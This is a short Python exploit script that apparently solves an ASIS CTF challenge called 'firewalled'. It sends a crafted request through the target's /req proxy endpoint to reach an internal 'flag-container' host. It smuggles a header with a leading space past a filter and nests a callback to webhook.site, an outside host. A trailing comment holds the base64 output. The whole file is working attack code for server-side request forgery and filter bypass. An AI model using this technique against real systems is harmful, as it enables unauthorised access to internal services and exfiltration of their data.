#!/usr/bin/env python3
import requests
import base64
import json

target = 'http://firewalled.asisctf.com:9000'

f = json.dumps({
	'host':'webhook.site',
	'headers':{},
	'method':'GET',
	'path':'/f1ab67c7-86d1-4510-943c-c24d3b711ff9',
	'returnJson':False
}).replace(' ','')

r = requests.post(f'{target}/req',json={
	'host':'flag-container',
	'headers':{
		'X-Request':'lol',
		' flag':'A',
	},
	'method':'GET',
	'path':'/flag?args='+f,
	'returnJson':True
})

print(base64.b64decode(r.json()['body']))
# ewAAACIAAAByAAAAZQAAAHEAAAB1AAAAZQAAAHMAAAB0AAAAIgAAADoAAAAgAAAAIgAAAGYAAABsAAAAYQAAAGcAAAAiAAAAfQAAAA==
